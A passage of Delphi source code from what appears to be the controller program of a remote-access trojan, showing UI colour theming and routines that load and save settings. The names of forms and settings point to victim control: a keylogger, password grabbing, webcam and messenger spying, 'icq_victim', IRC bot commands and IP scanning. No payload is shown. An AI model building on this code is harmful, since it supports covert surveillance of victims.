 Label4.Font.Color:=cFormText;
 Label5.Font.Color:=cFormText;
 Label6.Font.Color:=cFormText;
 Label7.Font.Color:=cFormText;
 Label8.Font.Color:=cFormText;
 Label9.Font.Color:=cFormText;
 Label10.Font.Color:=cFormText;
 Label11.Font.Color:=cFormText;
 Label12.Font.Color:=cFormText;
 Label13.Font.Color:=cFormText;
 Label14.Font.Color:=cFormText;
 Label15.Font.Color:=cFormText;
 Label16.Font.Color:=cFormText;
 Label17.Font.Color:=cFormText;
 Label18.Font.Color:=cFormText;
 Label19.Font.Color:=cFormText;
 Label20.Font.Color:=cFormText;
 VictimSample.Color:=cFormForeground;
 ClientSample.Color:=cFormForeground;
 Label21.Font.Color:=cFormText;
 Label22.Font.Color:=cFormText;
 Label23.Font.Color:=cFormText;
 Label24.Font.Color:=cFormText;
 Label26.Font.Color:=cFormText;
 Label27.Font.Color:=cFormText;
 Label28.Font.Color:=cFormText;
 Label29.Font.Color:=cFormText;
 Label30.Font.Color:=cFormText;
 Label31.Font.Color:=cFormText;
 Label33.Font.Color:=cFormText;
 Label34.Font.Color:=cFormText;
 Label35.Font.Color:=cFormText;
 Label36.Font.Color:=cFormText;
 Label37.Font.Color:=cFormText;
 Label38.Font.Color:=cFormText;
 Label39.Font.Color:=cFormText;
 Label40.Font.Color:=cFormText;
 Label41.Font.Color:=cFormText;
 Label42.Font.Color:=cFormText;
 Label46.Font.Color:=cFormText;
 Label47.Font.Color:=cFormText;
 Label48.Font.Color:=cFormText;
 Label49.Font.Color:=cFormText;
 Label50.Font.Color:=cFormText;
 Label51.Font.Color:=cFormText;
 Label52.Font.Color:=cFormText;
 Label53.Font.Color:=cFormText;
 Label54.Font.Color:=cFormText;
 Label55.Font.Color:=cFormText;
 Label56.Font.Color:=cFormText;
 Label57.Font.Color:=cFormText;
 Label58.Font.Color:=cFormText;
 Label59.Font.Color:=cFormText;
 Label60.Font.Color:=cFormText;
 Label61.Font.Color:=cFormText;Label61.Color:=cFormForeground;
 Label62.Font.Color:=cFormText;
 Label63.Font.Color:=cFormText;
 Label64.Font.Color:=cFormText;
 Label65.Font.Color:=cFormText;
 Label66.Font.Color:=cFormText;
 Label67.Font.Color:=cFormText;
 Label68.Font.Color:=cFormText;
 Label69.Font.Color:=cFormText;
 Label70.Font.Color:=cFormText;
 Label71.Font.Color:=cFormText;
 Label72.Font.Color:=cFormText;
 Label73.Font.Color:=cFormText;
 Label74.Font.Color:=cFormText;
 Label75.Font.Color:=cFormText;
 Label76.Font.Color:=cFormText;
 Label77.Font.Color:=cFormText;
 Label78.Font.Color:=cFormText;
 Label79.Font.Color:=cFormText;
 Label80.Font.Color:=cFormText;
 Label81.Font.Color:=cFormText;
 Label82.Font.Color:=cFormText;Label82.Color:=cFormForeGround;
 Label83.Font.Color:=cFormText;
 Label84.Font.Color:=cFormText;
 Label85.Font.Color:=cFormText;Label85.Color:=cFormForeGround;
 Label86.Font.Color:=cFormText;Label87.Font.Color:=cFormText;
 Label88.Font.Color:=cFormText;Label89.Font.Color:=cFormText;
 Label90.Font.Color:=cFormText;Label91.Font.Color:=cFormText;
 Label92.Font.Color:=cFormText;Label93.Font.Color:=cFormText;
 Label94.Font.Color:=cFormText;Label95.Font.Color:=cFormText;
 Label96.Font.Color:=cFormText;Label96.Font.Color:=cFormText;
 Label97.Font.Color:=cFormText;Label98.Font.Color:=cFormText;
 Label99.Font.Color:=cFormText;Label100.Font.Color:=cFormText;
 Label101.Font.Color:=cFormText;Label102.Font.Color:=cFormText;
 Label103.Font.Color:=cFormText;Label104.Font.Color:=cFormText;
 Label105.Font.Color:=cFormText;Label106.Font.Color:=cFormText;
 Label107.Font.Color:=cFormText;Label108.Font.Color:=cFormText;
 Label109.Font.Color:=cFormText;Label110.Font.Color:=cFormText;
 Label111.Font.Color:=cFormText;Label112.Font.Color:=cFormText;
 Label113.Font.Color:=cFormText;Label114.Font.Color:=cFormText;
 Label115.Font.Color:=cFormText;
// DirectoryListBox1.Color:=cFormForeground;
// DirectoryListBox1.Font.Color:=cFormText;
 FTPstatus.Font.Color:=cFormText;
 ShortcutButton.Font.Color:=cFormText;
except end; 
{ Shortcut1.Color:=cFormForeGround;
 Shortcut2.Color:=cFormForeGround;
 Shortcut3.Color:=cFormForeGround;
 Shortcut4.Color:=cFormForeGround;}
 with FlatHint do begin
  ColorArrow:=cFormText;ColorArrowBackground:=cFormCaption;ColorBackground:=cFormBackground;ColorBorder:=cFormLine;Font.Color:=cFormText;end;
 {components - [-FlatComboBox-]}
 with menCombo do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormForeground;
  ColorBorder:=cFormLine;Color:=cFormForeground;Font.Color:=cFormText;end;
 with winCombo do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormForeground;
  ColorBorder:=cFormLine;Color:=cFormForeground;Font.Color:=cFormText;end;
 with FlatComboBox1 do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormForeground;
  ColorBorder:=cFormLine;Color:=cFormForeground;Font.Color:=cFormText;end;
 with FlatComboBox2 do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormBackground;
  ColorBorder:=cFormLine;Color:=cFormBackground;Font.Color:=cFormText;end;
 with IPEdit do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormBackground;
  ColorBorder:=cFormLine;Color:=cFormBackground;Font.Color:=cFormText;end;
 with FlatComboBox3 do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormBackground;
  ColorBorder:=cFormLine;Color:=cFormBackground;Font.Color:=cFormText;end;
 {components - [-ColorComboBox-]}
 {components - [-FlatRadioButton-]}
 with FlatRadioButton1 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton2 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton3 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton4 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton5 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton6 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton7 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton8 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton9 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton10 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 {components - [-FlatCheckBox-]}
 with FlatCheckBox1 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox2 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox3 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox4 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox5 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox6 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox7 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox8 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox9 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox10 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox11 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox12 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox13 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatCheckBox14 do begin Color:=cFormBackground;ColorCheck:=cFormText;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 {components - [-FlatEditBox-]}
{ with IPedit do begin
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
} with PORTedit do begin
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormBackground;end;
 with FlatEdit1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit2 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit3 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit4 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit5 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit6 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit7 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit8 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit9 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit10 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit11 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit12 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit13 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit14 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit15 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit16 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit18 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit21 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit17 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit19 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit20 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit22 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit23 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit24 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit25 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit26 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit27 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with RxSpinEdit1 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with FlatEdit28 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit29 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit30 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit31 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit32 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit33 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit34 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit35 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit36 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit37 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit38 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit39 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit40 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit41 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit42 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with FlatEdit43 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
{ with FlatEdit34 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;}
 with ip1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with ip2 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with ip3 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with ip4 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with eip1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with eip2 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with eip3 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 with eip4 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
{ with pb do begin ColorBorder:=cFormLine;ColorElement:=cFormCaption;Color:=cFormForeground;end;
 {MainForm.Hide;MainForm.Show;}

 {components - [-Memo-]}
 with ListBox2 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with BotCommands do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with InfoMemo do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with PrintMemo do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with Memo3 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with Memo4 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
{ with ScrollBox1 do begin Color:=cFormForeground;Font.Color:=cFormText;end;}
 with ResList do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with Memo1 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with Memo5 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with SpeechMemo do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with ListBox1 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with ListBox2 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with ListBox3 do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 {try Tipar.SetTheColors; except end;}
 {components - [-Buoane-]}
 CloseButton.Color:=cFormCaption;
{ with ABButton do begin
  A3DBotCl:=cFormForeGround;
  A3DTopCl:=cFormForeGround;
  FrameColor:=cFormForeground;
 end;}
 with CloseButton do begin
  Color:=cFormCaption;ColorBorder:=cFormCaption;Font.Color:=cFormText;
  ColorDown:=cFormBackground;ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;ColorShadow:=cFormLine;
 end;
 with CancelButton do begin
  Color:=cFormBackground;ColorBorder:=cFormLine;Font.Color:=cFormText;
  ColorDown:=cFormCaption;ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;ColorShadow:=cFormLine;
 end;
 with MinimizeButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
 end;
 with IPToolButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
 end;
 with FlatSpeedButton1 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton2 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton3 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton4 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton5 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton6 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton7 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton8 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton9 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 {components - [-FORMS-]}
 PortList.Font.Color:=cFormText;
 PortList.Color:=cFormForeground;
 ICQList.Font.Color:=cFormText;
 ICQList.Color:=cFormForeground;
 try
  Anim.SetTheColors;
  GetTextForm.SetTheColors;
  KeyLogger.SetTheColors;
  DispInfo.SetTheColors;
  MsgForm.SetTheColors;
  ClientChat.SetTheColors;
  VictimChat.SetTheColors;
  Pass.SetTheColors;
  FindFiles.SetTheColors;
  RegEdit.SetTheColors;
  ICQForm.SetTheColors;
  ShowImg.SetTheColors;
  nonstopForm.SetTheColors;
  webcam.SetTheColors;
  winM.SetTheColors;
  fileM.SetTheColors;
  GetNewPath.SetTheColors;
  PopUp.SetTheColors;
  ShortcutForm.SetTheColors;
  msnForm.SetTheColors;
  TheMatrix.SetTheColors;
  IPTool.SetTheColors;
  ProcM.SetTheColors;
  About.SetTheColors;
  AddressBook.SetTheColors;
  for i:=1 to 20 do if SpyFormName[i]<>'' then
   try SpyFormMSN[i].SetTheColors;except end;
  for i:=1 to 20 do if SpyFormName2[i]<>'' then
   try SpyFormAIM[i].SetTheColors; except end;
 except end;
end;

procedure TMainForm.LoadSettings;
var i,i2:integer;
    r,cmd:string;
begin
try
 r:=ReadKey('7_x');if r<>'' then MainForm.Left:=StrToInt(r);
 r:=ReadKey('7_y');if r<>'' then MainForm.Top:=StrToInt(r);
except end;
 Label61.Caption:=ReadKey('folder');
 FlatEdit11.Text:=ReadKey('nickname');
 try i2:=StrToInt(ReadKey('ips_count'));except end;
 IPEdit.Items.Clear;
 for i:=0 to i2 do
  try IPEdit.Items.Add(ReadKey('ips_'+IntToStr(i)));except end;
 IPEdit.Text:=ReadKey('current_ip');
 portEdit.Text:=ReadKey('current_port');
 FlatEdit1.Text:=ReadKey('icq_uin');
 FlatEdit2.Text:=ReadKey('icq_victim');
 FlatEdit4.Text:=ReadKey('irc_server');
 FlatEdit3.Text:=ReadKey('irc_port');
 FlatEdit5.Text:=ReadKey('irc_chan');
 FlatEdit6.Text:=ReadKey('email_server');
 FlatEdit7.Text:=ReadKey('email_user');
 FlatEdit8.Text:=ReadKey('email_email');
 FlatEdit13.Text:=ReadKey('chat_size');
 try Label25.Color:=StringToColor(ReadKey('v_color'));except end;
 try Label32.Color:=StringToColor(ReadKey('c_color'));except end;
 FlatEdit12.Text:=ReadKey('v_font');
 FlatEdit14.Text:=ReadKey('c_font');
 FlatEdit16.Text:=ReadKey('ftp_port');
 FlatEdit18.Text:=ReadKey('ftp_clients');
 FlatEdit19.Text:=ReadKey('find_what');
 FlatEdit20.Text:=ReadKey('find_where');
 if ReadKey('ftp_subdir')='1' then FlatCheckBox2.Checked:=true else FlatCheckBox2.Checked:=False;
 if ReadKey('print_b')='1' then FlatSpeedButton6.Down:=true else FlatSpeedButton6.Down:=False;
 if ReadKey('print_i')='1' then FlatSpeedButton7.Down:=true else FlatSpeedButton7.Down:=False;
 if ReadKey('print_u')='1' then FlatSpeedButton8.Down:=true else FlatSpeedButton8.Down:=False;
 if ReadKey('print_s')='1' then FlatSpeedButton9.Down:=true else FlatSpeedButton9.Down:=False;
 FlatEdit21.Text:=ReadKey('print_size');
 PrintMemo.Lines.Text:=ReadKey('print_text');
 FlatEdit22.Text:=ReadKey('browser');
 try Label43.Color:=StringToColor(ReadKey('wincol_1'));except end;
 try Label44.Color:=StringToColor(ReadKey('wincol_2'));except end;
 try Label45.Color:=StringToColor(ReadKey('wincol_3'));except end;
 FlatEdit23.Text:=ReadKey('rec');
 try TrackBar1.Value:=StrToInt(ReadKey('qual_desk'));except end;
 try TrackBar2.Value:=StrToInt(ReadKey('qual_full'));except end;
 try TrackBar3.Value:=StrToInt(ReadKey('qual_webcam'));except end;
 {new}
 if ReadKey('hints')='0' then FlatCheckBox1.Checked:=False else FlatCheckBox1.Checked:=True;
 if ReadKey('tray')='0' then FlatCheckBox5.Checked:=False else FlatCheckBox5.Checked:=True;
 if ReadKey('show_images')='0' then FlatCheckBox6.Checked:=False else FlatCheckBox6.Checked:=True;
 if ReadKey('run_notepad')='0' then FlatCheckBox7.Checked:=False else FlatCheckBox7.Checked:=True;
 FlatCheckBox1ClickIT;
 FlatEdit26.Text:=ReadKey('ss_text');
 FlatEdit27.Text:=ReadKey('ss_size');
 FlatComboBox2.Text:=ReadKey('ss_font');
 cmd:=ReadKey('ss_attrib');
 if cmd[1]='1' then FlatCheckBox8.Checked:=True else FlatCheckBox8.Checked:=False;
 if cmd[2]='1' then FlatCheckBox9.Checked:=True else FlatCheckBox9.Checked:=False;
 if cmd[3]='1' then FlatCheckBox10.Checked:=True else FlatCheckBox10.Checked:=False;
 if cmd[4]='0' then FlatRadioButton7.Checked:=True else FlatRadioButton8.Checked:=True;
 if cmd[5]='1' then FlatCheckBox11.Checked:=True else FlatCheckBox11.Checked:=False;
 try RxSlider1.Value:=StrToInt(ReadKey('ss_speed'));except end;
 try SSText.Color:=StringToColor(ReadKey('ss_ctext'));except end;
 try SSBack.Color:=StringToColor(ReadKey('ss_cbackground'));except end;
 if ReadKey('win_anim')='1' then FlatCheckBox12.Checked:=True else FlatCheckBox12.Checked:=False;
 if ReadKey('ftp_mask')='1' then FlatCheckBox13.Checked:=True else FlatCheckBox13.Checked:=False;
try
 Memo2.Lines.Text:=ReadKey('matrix_open_text');
 FlatEdit28.Text:=ReadKey('port_matrix');
 FlatEdit29.Text:=ReadKey('port_keyz');
 FlatEdit30.Text:=ReadKey('port_spy');
 FlatEdit42.Text:=ReadKey('port_sniff');
{ FlatEdit32.Text:=ReadKey('port_appredir');}
 ip1.text:=ReadKey('scan_ip1');
 ip2.text:=ReadKey('scan_ip2');
 ip3.text:=ReadKey('scan_ip3');
 ip4.text:=ReadKey('scan_ip4');
 eip1.text:=ReadKey('scan_ip5');
 eip2.text:=ReadKey('scan_ip6');
 eip3.text:=ReadKey('scan_ip7');
 eip4.text:=ReadKey('scan_ip8');
 FlatEdit32.Text:=ReadKey('scan_port');
 try RxSpinEdit1.Value:=StrToInt(ReadKey('scand_delay'));except RxSpinEdit1.Value:=4;end;
 FlatEdit35.Text:=ReadKey('bot_server');
 FlatEdit36.Text:=ReadKey('bot_port');
 FlatEdit37.Text:=ReadKey('bot_nick');
 FlatEdit38.Text:=ReadKey('bot_pass');
 FlatEdit39.Text:=ReadKey('bot_prefix');
 FlatEdit40.Text:=ReadKey('bot_channel');
 FlatEdit41.Text:=ReadKey('bot_key');
 BotCommands.Lines.Text:=ReadKey('bot_commands');
 if ReadKey('bot_autostart')='yes' then FlatCheckBox14.Checked:=True else FlatCheckBox14.Checked:=False;
 Bookmarks.BookmarkList.Items.Text:=ReadKey('bookmarks');
except end;
try
 ListBox2.Items.Text:=ReadKey('ps_ports');
 if ReadKey('ps_all')='0' then begin FlatRadioButton9.Checked:=true;FlatRadioButton10.Checked:=false;end
  else begin FlatRadioButton10.Checked:=true;FlatRadioButton9.Checked:=false;end;
except end;
end;

procedure TMainForm.SaveRegSettings;
var dl,cmd:string;
    i:integer;
begin
try
 dl:=Label61.Caption;
 if dl[length(dl)]<>'\' then dl:=dl+'\';
 Label61.Caption:=dl;
 WriteKey('folder',dl);
 WriteKey('nickname',FlatEdit11.Text);
 try WriteKey('ips_count',IntToStr(IPEdit.Items.Count-1));except end;
 for i:=0 to IPEdit.Items.Count-1 do
  WriteKey('ips_'+IntToStr(i),IPEdit.Items[i]);
 WriteKey('current_ip',IPEdit.Text);
 WriteKey('current_port',portEdit.Text);
 WriteKey('icq_uin',FlatEdit1.Text);
 WriteKey('icq_victim',FlatEdit2.Text);
